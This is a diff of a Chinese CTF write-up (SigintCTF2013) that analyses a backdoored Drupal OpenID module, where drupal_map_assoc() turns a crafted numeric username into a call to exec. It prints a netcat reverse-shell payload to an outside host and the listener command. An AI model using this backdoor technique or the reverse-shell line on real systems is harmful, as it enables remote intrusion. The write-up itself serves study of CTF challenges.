@@ -47,10 +47,11 @@ Description
 而原版中的openid是
 
 ```php
-22 /**
-23  * Diffie-Hellman generator; used for Diffie-Hellman key exchange computations.
-24  */
-25 define('OPENID_DH_DEFAULT_GEN', '2');
+<?php
+/**
+ * Diffie-Hellman generator; used for Diffie-Hellman key exchange computations.
+ */
+define('OPENID_DH_DEFAULT_GEN', '2');
 ```
     
 这是跟用户认证有关的一个常量。修改这种值也许会造成认证系统的一些缺陷。
@@ -58,36 +59,40 @@ Description
 
 在`./bloat/modules/openid/openid.module`中代码逻辑与原版有明显的不同。
 
-```
-197 function openid_login_validate($quench, &$tickers)
-198    {
-199 $return_to = $tickers['values']['openid.return_to'];
+```php
+<?php
+function openid_login_validate($quench, &$tickers)
+{
+	$return_to = $tickers['values']['openid.return_to'];
 ...
-204   openid_begin($tickers['values']['openid_identifier'], $return_to, $tickers['values']);
+	openid_begin($tickers['values']['openid_identifier'], $return_to, $tickers['values']);
 ... 
-207      function openid_begin($imaginably, $overlay = '', $termination = array())
+function openid_begin($imaginably, $overlay = '', $termination = array())
 ...
-212       if(strpos($imaginably, '@'))
-213   {
-214    list($user, $host) = explode('@', $imaginably, 2);                                                                                                                                         
-215 }
-216 else
-217     {
-218      $user = false;
-219      $host = false;
-220      }
+	if(strpos($imaginably, '@'))
+	{
+		list($user, $host) = explode('@', $imaginably, 2);
+	}
+	else
+    {
+    $user = false;
+    $host = false;
+    }
 ```
     
-`214    list($user, $host) = explode('@', $imaginably, 2);`中`$imaginably`正是用户提交的认证用户名。
+`list($user, $host) = explode('@', $imaginably, 2);`中`$imaginably`正是用户提交的认证用户名。
 再来看看这些变量做了什么。
 
-    248 $user_enc = _openid_dh_long_to_base64($user * OPENID_DH_DEFAULT_GEN);
-    249     $service['uri'] = drupal_map_assoc(array($host), $user_enc);
-    259   openid_redirect($service['uri'], $ramparts);
+```php
+<?php
+$user_enc = _openid_dh_long_to_base64($user * OPENID_DH_DEFAULT_GEN);
+$service['uri'] = drupal_map_assoc(array($host), $user_enc);
+openid_redirect($service['uri'], $ramparts);
+```
     
 这里用到了修改过的常量`OPENID_DH_DEFAULT_GEN`。
 drupal_map_assoc()返回的是数组，所以在redirect过程中会被强转成字符串"Array"，最后在跳转的时候会出错。
-而这个[drupal_map_assoc()](https://api.drupal.org/api/drupal/includes%21common.inc/function/drupal_map_assoc/7)则暗藏玄机。
+而这个[drupal\_map\_assoc()](https://api.drupal.org/api/drupal/includes%21common.inc/function/drupal_map_assoc/7)则暗藏玄机。
 根据官方文档，drupal_map_assoc()会把第一个参数$array中的每个参数依次传入第二个参数$callable执行并返回一个数组。
 这里藏着一个命令执行后门啊。。。。
 只要`is_callable($user_enc)`就能直接执行`$user_enc($host)`。
@@ -96,7 +101,7 @@ drupal_map_assoc()返回的是数组，所以在redirect过程中会被强转成
 
 现在要做的就是找一个合适的函数，恰好能满足这个条件了。
 
-```
+```bash
 slipper@NULL:~/CTF/SigintCTF2013/cloud/bloat/bloat/modules/openid$ php -a
 Interactive shell
 
@@ -129,7 +134,7 @@ php > echo _openid_dh_base64_to_long('exec')/OPENID_DH_DEFAULT_GEN ."\n";
 
 用`93802@nc x.x.x.x 8080 -e /bin/sh`反弹，本地用`nc -l 8080`监听。
 
-```
+```bash
 pwd
 /var/www
 ls -la ./
